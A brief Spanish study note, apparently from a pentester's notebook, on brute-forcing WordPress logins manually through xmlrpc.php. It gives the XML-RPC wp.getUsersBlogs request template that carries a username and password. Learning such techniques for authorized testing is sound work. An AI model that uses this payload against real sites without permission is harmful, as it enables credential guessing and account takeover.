--------------
- Tags: #web #scripting #bash #herramientas #wordpress 
----------------------

SI quisiéramos aplicar fuerza bruta en un [[WordPress]] de la misma forma que hace [[Wpscan]] pero de forma manual, para descubrir credenciales válidas, sería necesario tramitar una petición por el método POST al archivo **xmlrpc.php** tramitando una estructura en xml, como se detalla a continuación:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<methodCall> 
<methodName>wp.getUsersBlogs</methodName> 
<params> 
<param><value>Usuario</value></param> 
<param><value>Contraseña</value></param> 
</params> 
</methodCall>
```

![[Pasted image 20230611231007.png]]

